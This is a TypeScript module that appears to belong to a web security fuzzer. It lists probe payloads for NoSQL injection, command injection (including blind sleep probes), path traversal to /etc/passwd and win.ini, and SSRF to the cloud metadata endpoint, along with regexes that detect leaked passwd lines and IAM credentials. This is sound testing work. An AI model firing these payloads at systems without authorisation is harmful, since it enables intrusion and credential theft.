export type FuzzCategory = "nosql_injection" | "command_injection" | "path_traversal" | "ssrf";

export interface FuzzPayload {
  category: FuzzCategory;
  value: string;
  description: string;
}

export const NOSQL_INJECTION_PAYLOADS: FuzzPayload[] = [
  { category: "nosql_injection", value: '{"$gt":""}', description: "MongoDB greater-than operator bypass" },
  { category: "nosql_injection", value: '{"$ne":null}', description: "MongoDB not-equal operator bypass" },
  { category: "nosql_injection", value: '{"$regex":".*"}', description: "MongoDB regex wildcard operator bypass" },
];

export const COMMAND_INJECTION_PAYLOADS: FuzzPayload[] = [
  { category: "command_injection", value: "; id", description: "command chaining via semicolon" },
  { category: "command_injection", value: "| id", description: "command chaining via pipe" },
  { category: "command_injection", value: "`id`", description: "command substitution via backticks" },
  { category: "command_injection", value: "$(id)", description: "command substitution via subshell" },
];

// Used only for timing analysis; the delay itself is the signal, not any reflected output.
export const COMMAND_INJECTION_BLIND_PAYLOADS: FuzzPayload[] = [
  { category: "command_injection", value: "; sleep 3", description: "blind command chaining with sleep delay" },
  { category: "command_injection", value: "$(sleep 3)", description: "blind command substitution with sleep delay" },
];

export const PATH_TRAVERSAL_PAYLOADS: FuzzPayload[] = [
  { category: "path_traversal", value: "../../../../etc/passwd", description: "unix relative path traversal" },
  { category: "path_traversal", value: "..\\..\\..\\windows\\win.ini", description: "windows relative path traversal" },
  { category: "path_traversal", value: "%2e%2e%2fetc%2fpasswd", description: "url-encoded path traversal" },
];

export const SSRF_PAYLOADS: FuzzPayload[] = [
  { category: "ssrf", value: "http://169.254.169.254/latest/meta-data/", description: "cloud instance metadata endpoint" },
  { category: "ssrf", value: "http://127.0.0.1:22", description: "internal loopback service port" },
];

export const COMMAND_OUTPUT_LEAK_PATTERNS = [
  /uid=\d+\([\w.-]+\)\s+gid=\d+/i,
  /root:.*:0:0:/i,
];

export const PATH_TRAVERSAL_LEAK_PATTERNS = [
  /root:.*:0:0:/i,
  /\[extensions\]/i,
  /\[fonts\]/i,
];

export const SSRF_LEAK_PATTERNS = [
  /ami-id/i,
  /instance-id/i,
  /iam\/security-credentials/i,
  /instance-action/i,
];
